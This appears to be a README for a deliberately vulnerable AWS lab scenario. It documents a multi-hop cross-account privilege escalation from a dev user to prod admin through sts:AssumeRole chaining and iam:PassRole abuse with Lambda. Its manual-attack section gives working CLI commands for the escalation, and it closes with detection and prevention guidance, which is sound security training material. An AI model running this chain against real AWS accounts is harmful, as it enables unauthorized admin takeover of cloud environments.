# Cross-Account PassRole to Lambda Admin

* **Category:** Privilege Escalation
* **Sub-Category:** privilege-chaining
* **Path Type:** cross-account
* **Target:** to-admin
* **Environments:** dev, prod
* **Cost Estimate:** $0/mo
* **Technique:** Multi-hop cross-account privilege escalation using PassRole to create Lambda with admin role
* **Terraform Variable:** `enable_cross_account_dev_to_prod_multi_hop_passrole_lambda_admin`
* **Schema Version:** 1.0.0
* **Attack Path:** starting_user_dev → (AssumeRole) → dev_lambda_updater → (sts:AssumeRole cross-account) → prod_lambda_updater → (iam:PassRole + lambda:CreateFunction) → lambda_admin_role → admin access
* **Attack Principals:** `arn:aws:iam::{dev_account_id}:user/pl-pathfinding-starting-user-dev`; `arn:aws:iam::{dev_account_id}:role/pl-lambda-prod-updater`; `arn:aws:iam::{prod_account_id}:role/pl-lambda-updater`; `arn:aws:iam::{prod_account_id}:role/pl-Lambda-admin`
* **Required Permissions:** `iam:PassRole` on `arn:aws:iam::{prod_account_id}:role/pl-Lambda-admin`; `lambda:CreateFunction` on `*`; `lambda:InvokeFunction` on `*`
* **Helpful Permissions:** `iam:ListRoles` (Discover roles that can be passed to Lambda); `lambda:ListFunctions` (View existing Lambda functions); `iam:GetRole` (View role permissions and trust policies)
* **MITRE Tactics:** TA0004 - Privilege Escalation, TA0008 - Lateral Movement
* **MITRE Techniques:** T1078.004 - Valid Accounts: Cloud Accounts, T1648 - Serverless Execution, T1098 - Account Manipulation

## Attack Overview

This module demonstrates a multi-hop cross-account privilege escalation attack where a dev user can escalate to admin privileges through a chain of role assumptions, ultimately using `iam:PassRole` permission to create Lambda functions with admin roles.

The attack path shows how a dev user can escalate to admin privileges through multi-hop role assumption and PassRole permission abuse:
1. `pl-pathfinding-starting-user-dev` (user) → `pl-lambda-prod-updater` (dev role)
2. `pl-lambda-prod-updater` (dev role) → `pl-lambda-updater` (prod role)
3. `pl-lambda-updater` (prod role) → `pl-Lambda-admin` (via PassRole to Lambda service)

### MITRE ATT&CK Mapping

- **Tactics**: TA0004 - Privilege Escalation, TA0008 - Lateral Movement
- **Techniques**: T1078.004 - Valid Accounts: Cloud Accounts, T1648 - Serverless Execution, T1098 - Account Manipulation

### Principals in the attack path

- `arn:aws:iam::{DEV_ACCOUNT}:user/pl-pathfinding-starting-user-dev` — Starting dev user; has permission to assume the dev lambda-prod-updater role
- `arn:aws:iam::{DEV_ACCOUNT}:role/pl-lambda-prod-updater` — Dev role; trusted by the starting user and has permission to assume the prod lambda-updater role cross-account
- `arn:aws:iam::{PROD_ACCOUNT}:role/pl-lambda-updater` — Prod role; trusted by the dev role and holds `iam:PassRole` + Lambda permissions
- `arn:aws:iam::{PROD_ACCOUNT}:role/pl-Lambda-admin` — Admin role that can be passed to the Lambda service; holds full administrative privileges

### Attack Path Diagram

```mermaid
graph LR
    %% Nodes
    StartingUser[dev:iam:pl-pathfinding-starting-user-dev]
    DevRole[dev:iam:pl-lambda-prod-updater]
    ProdRole[prod:iam:pl-lambda-updater]
    LambdaAdmin[prod:iam:pl-Lambda-admin]
    LambdaFunction[prod:lambda:function:admin-function]

    %% Edges
    StartingUser -->|sts:AssumeRole| DevRole
    DevRole -->|sts:AssumeRole| ProdRole
    ProdRole -->|iam:PassRole| LambdaAdmin
    ProdRole -->|lambda:CreateFunction| LambdaFunction
    LambdaFunction -->|uses| LambdaAdmin

    %% Styling
    classDef userNode fill:#ff9999,stroke:#333,stroke-width:2px
    classDef roleNode fill:#ffcc99,stroke:#333,stroke-width:2px
    classDef adminNode fill:#99ff99,stroke:#333,stroke-width:2px
    classDef serviceNode fill:#ffcc99,stroke:#333,stroke-width:2px

    class StartingUser userNode
    class DevRole,ProdRole roleNode
    class LambdaAdmin adminNode
    class LambdaFunction serviceNode
```



### Attack Steps

1. **Initial Access**: Dev user `pl-pathfinding-starting-user-dev` has `sts:AssumeRole` permission on dev role `pl-lambda-prod-updater`
2. **Hop 1 - First Role Assumption**: Dev user assumes the dev role `pl-lambda-prod-updater`
3. **Hop 2 - Cross-Account Assumption**: Dev role assumes the prod role `pl-lambda-updater` cross-account
4. **Hop 3 - PassRole Abuse**: The prod role has `iam:PassRole` permission and creates a Lambda function passing the `pl-Lambda-admin` role (which has full admin permissions)
5. **Admin Access**: Invoke the Lambda function, which executes with full admin privileges
6. **Verification**: Confirm admin access by calling `sts:GetCallerIdentity` or listing privileged resources from within the Lambda

### Scenario specific resources created

| ARN | Purpose |
|-----|---------|
| `arn:aws:iam::{DEV_ACCOUNT}:role/pl-lambda-prod-updater` | Dev role assumed by starting user; bridges dev to prod |
| `arn:aws:iam::{PROD_ACCOUNT}:role/pl-lambda-updater` | Prod role trusted by dev role; holds PassRole + Lambda permissions |
| `arn:aws:iam::{PROD_ACCOUNT}:role/pl-Lambda-admin` | Admin role passable to Lambda; grants full administrative access |

## Attack Lab

### Prerequisites

1. Install the `plabs` CLI:
   ```bash
   brew install pathfinding-labs/tap/plabs
   ```
2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)

### Deploy with plabs non-interactive

```bash
plabs enable enable_cross_account_dev_to_prod_multi_hop_passrole_lambda_admin
plabs apply
```

### Deploy with plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `space` to enable it
4. Press `d` to deploy

### Executing the automated demo_attack script

The script will:

1. **Verification**: Check current identity and permissions of the starting dev user
2. **First Role Assumption**: Assume the dev lambda-prod-updater role
3. **Cross-Account Role Assumption**: Assume the prod lambda-updater role cross-account
4. **PassRole Abuse**: Create a Lambda function using the admin role
5. **Admin Verification**: Invoke the Lambda function to confirm admin access
6. **Cleanup**: Remove the created Lambda function

#### Resources created by attack script

- A temporary Lambda function in the prod account using the `pl-Lambda-admin` role

#### With plabs non-interactive

```bash
plabs demo --list
plabs demo passrole-lambda-admin
```

#### With plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `r` to run the demo script

### Executing the attack manually

```bash
# Step 1 — Assume the dev role from the starting user
DEV_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::{DEV_ACCOUNT}:role/pl-lambda-prod-updater \
  --role-session-name hop1 \
  --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
  --output text)

export AWS_ACCESS_KEY_ID=$(echo "$DEV_CREDS" | awk '{print $1}')
export AWS_SECRET_ACCESS_KEY=$(echo "$DEV_CREDS" | awk '{print $2}')
export AWS_SESSION_TOKEN=$(echo "$DEV_CREDS" | awk '{print $3}')

# Verify hop 1 identity
aws sts get-caller-identity

# Step 2 — Cross-account assume the prod role
PROD_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::{PROD_ACCOUNT}:role/pl-lambda-updater \
  --role-session-name hop2 \
  --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
  --output text)

export AWS_ACCESS_KEY_ID=$(echo "$PROD_CREDS" | awk '{print $1}')
export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_CREDS" | awk '{print $2}')
export AWS_SESSION_TOKEN=$(echo "$PROD_CREDS" | awk '{print $3}')

# Verify hop 2 identity
aws sts get-caller-identity

# Step 3 — Create a Lambda function using the admin role (PassRole abuse)
# Create a minimal Lambda payload
cat > /tmp/lambda_payload.py << 'EOF'
import boto3, json

def handler(event, context):
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    return {"identity": identity['Arn'], "account": identity['Account']}
EOF
zip /tmp/lambda_payload.zip /tmp/lambda_payload.py

aws lambda create-function \
  --function-name pl-passrole-demo \
  --runtime python3.12 \
  --role arn:aws:iam::{PROD_ACCOUNT}:role/pl-Lambda-admin \
  --handler lambda_payload.handler \
  --zip-file fileb:///tmp/lambda_payload.zip \
  --region us-east-1

# Step 4 — Invoke the Lambda function and confirm admin access
aws lambda invoke \
  --function-name pl-passrole-demo \
  --region us-east-1 \
  /tmp/lambda_response.json
cat /tmp/lambda_response.json

# Step 5 — Cleanup: delete the demo Lambda function
aws lambda delete-function \
  --function-name pl-passrole-demo \
  --region us-east-1
```

### Cleanup

#### With plabs non-interactive

```bash
plabs cleanup --list
plabs cleanup passrole-lambda-admin
```

#### With plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `c` to run the cleanup script

### Teardown with plabs non-interactive

```bash
plabs disable enable_cross_account_dev_to_prod_multi_hop_passrole_lambda_admin
plabs apply
```

### Teardown with plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `space` to disable it
4. Press `D` to destroy

## Detecting Misconfiguration (CSPM)

### What CSPM tools should detect

- IAM role `pl-lambda-updater` in the prod account holds `iam:PassRole` on a role with `AdministratorAccess`, creating a privilege escalation path from the dev account
- Cross-account trust relationship allows a dev account role (`pl-lambda-prod-updater`) to assume a prod account role (`pl-lambda-updater`) that holds sensitive PassRole permissions
- The `pl-Lambda-admin` role has a trust policy permitting the Lambda service to assume it with full administrative privileges, and that role is passable by a non-admin principal
- Multi-hop role assumption chain (dev user → dev role → prod role → Lambda admin) is detectable as a privilege escalation path via graph-based IAM analysis

### Prevention recommendations

1. **Principle of Least Privilege**: Avoid granting `iam:PassRole` permissions unless absolutely necessary; scope PassRole with `iam:PassedToService` and `iam:ResourceTag` conditions
2. **Cross-Account Restrictions**: Limit cross-account role assumptions to specific use cases; require `aws:PrincipalOrgID` or explicit account conditions in trust policies
3. **Multi-Hop Prevention**: Avoid creating long chains of role assumptions; use direct access where possible and enforce SCP controls on cross-account assumptions
4. **Role Trust Policies**: Use more restrictive trust policies for service roles; require `iam:AssociatedResourceArn` conditions where supported
5. **PassRole Monitoring**: Monitor and alert on `iam:PassRole` usage, especially when the passed role has elevated permissions
6. **Regular Audits**: Regularly audit cross-account permissions and PassRole usage using IAM Access Analyzer cross-account findings
7. **Service Role Restrictions**: Limit which roles can be passed to which services using `iam:PassedToService` conditions in PassRole policies

## Detection Abuse (CloudSIEM)

### CloudTrail events to monitor

- `STS: AssumeRole` — Role assumption from the dev starting user into `pl-lambda-prod-updater`; alert when a cross-account assumption chain originates from a dev account principal
- `STS: AssumeRole` — Cross-account role assumption from `pl-lambda-prod-updater` (dev) into `pl-lambda-updater` (prod); high severity when the source account is a non-prod account
- `IAM: PassRole` — `pl-Lambda-admin` (admin role) passed to the Lambda service by `pl-lambda-updater`; critical when the passed role has administrative permissions
- `Lambda: CreateFunction20150331` — New Lambda function created with an admin execution role; high severity when the role ARN resolves to a privileged role
- `Lambda: Invoke` — Invocation of the newly created Lambda function; correlate with the preceding `CreateFunction` to detect execution-after-creation patterns

### Detonation logs

_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._
